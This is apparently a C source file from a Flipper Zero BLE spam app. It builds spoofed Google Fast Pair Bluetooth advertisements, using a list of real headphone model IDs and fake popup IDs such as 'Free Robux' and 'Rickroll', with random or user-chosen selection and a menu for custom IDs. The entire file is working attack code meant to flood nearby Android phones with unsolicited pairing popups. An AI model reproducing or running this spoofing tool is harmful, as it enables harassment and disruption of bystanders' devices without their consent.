#include "fastpair.h"
#include "_protocols.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://developers.google.com/nearby/fast-pair/specifications/introduction

const struct {
    uint32_t id;
    const char* name;
} models[] = {
    // Genuine devices
    {0xCD8256, "Bose NC 700"},
    {0xF52494, "JBL Buds Pro"},
    {0x718FA4, "JBL Live 300TWS"},
    {0x821F66, "JBL Flip 6"},
    {0x92BBBD, "Pixel Buds"},
    {0xD446A7, "Sony XM5"},
    {0x2D7A23, "Sony WF-1000XM4"},

    // Custom debug popups
    {0xD99CA1, "Flipper Zero"},
    {0x77FF67, "Free Robux"},
    {0xAA187F, "Free VBucks"},
    {0xDCE9EA, "Rickroll"},
    {0x87B25F, "Animated Rickroll"},
    {0x1448C9, "BLM"},
    {0x13B39D, "Talking Sasquach"},
};
const uint8_t models_count = COUNT_OF(models);

static const char* fastpair_get_name(const ProtocolCfg* _cfg) {
    const FastpairCfg* cfg = &_cfg->fastpair;
    UNUSED(cfg);
    return "FastPair";
}

static void fastpair_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg* _cfg) {
    const FastpairCfg* cfg = _cfg ? &_cfg->fastpair : NULL;

    uint32_t model_id;
    if(cfg && cfg->model_id != 0x000000) {
        model_id = cfg->model_id;
    } else {
        model_id = models[rand() % models_count].id;
    }

    uint8_t size = 14;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...

    packet[i++] = 6; // Size
    packet[i++] = 0x16; // AD Type (Service Data)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...
    packet[i++] = (model_id >> 0x10) & 0xFF; // Model ID
    packet[i++] = (model_id >> 0x08) & 0xFF; // ...
    packet[i++] = (model_id >> 0x00) & 0xFF; // ...

    packet[i++] = 2; // Size
    packet[i++] = 0x0A; // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

    *_size = size;
    *_packet = packet;
}

enum {
    ConfigModelId,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigModelId:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModelId);
    default:
        break;
    }
}
static void model_id_changed(VariableItem* item) {
    FastpairCfg* cfg = variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        cfg->model_id = models[index].id;
        variable_item_set_current_value_text(item, models[index].name);
    } else {
        cfg->model_id = 0x000000;
        variable_item_set_current_value_text(item, "Random");
    }
}
static uint8_t fastpair_config_list(Ctx* ctx) {
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    VariableItemList* list = ctx->variable_item_list;
    uint8_t item_count = 0;
    VariableItem* item;
    size_t value_index;

    item_count++;
    item = variable_item_list_add(list, "Model ID", models_count + 1, model_id_changed, cfg);
    const char* model_name = NULL;
    char model_name_buf[9];
    if(cfg->model_id == 0x000000) {
        model_name = "Random";
        value_index = 0;
    } else {
        for(uint8_t i = 0; i < models_count; i++) {
            if(cfg->model_id == models[i].id) {
                model_name = models[i].name;
                value_index = i + 1;
                break;
            }
        }
        if(!model_name) {
            snprintf(model_name_buf, sizeof(model_name_buf), "%06lX", cfg->model_id);
            model_name = model_name_buf;
            value_index = models_count + 1;
        }
    }
    variable_item_set_current_value_index(item, value_index);
    variable_item_set_current_value_text(item, model_name);

    variable_item_list_set_enter_callback(list, config_callback, ctx);

    return item_count;
}

const Protocol protocol_fastpair = {
    .icon = &I_android,
    .get_name = fastpair_get_name,
    .make_packet = fastpair_make_packet,
    .config_list = fastpair_config_list,
};

static void model_id_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    switch(index) {
    case 0:
        cfg->model_id = 0x000000;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModelIdCustom);
        break;
    default:
        cfg->model_id = models[index - 1].id;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_fastpair_model_id_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    bool found = false;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, model_id_callback, ctx);
    if(cfg->model_id == 0x000000) {
        found = true;
        selected = 0;
    }
    for(uint8_t i = 0; i < models_count; i++) {
        submenu_add_item(submenu, models[i].name, i + 1, model_id_callback, ctx);
        if(!found && cfg->model_id == models[i].id) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", models_count + 1, model_id_callback, ctx);
    if(!found) {
        found = true;
        selected = models_count + 1;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_fastpair_model_id_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_model_id_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void model_id_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_fastpair_model_id_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Model ID");

    ctx->byte_store[0] = (cfg->model_id >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->model_id >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->model_id >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, model_id_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_fastpair_model_id_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_model_id_custom_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    FastpairCfg* cfg = &ctx->attack->payload.cfg.fastpair;
    cfg->model_id =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
}
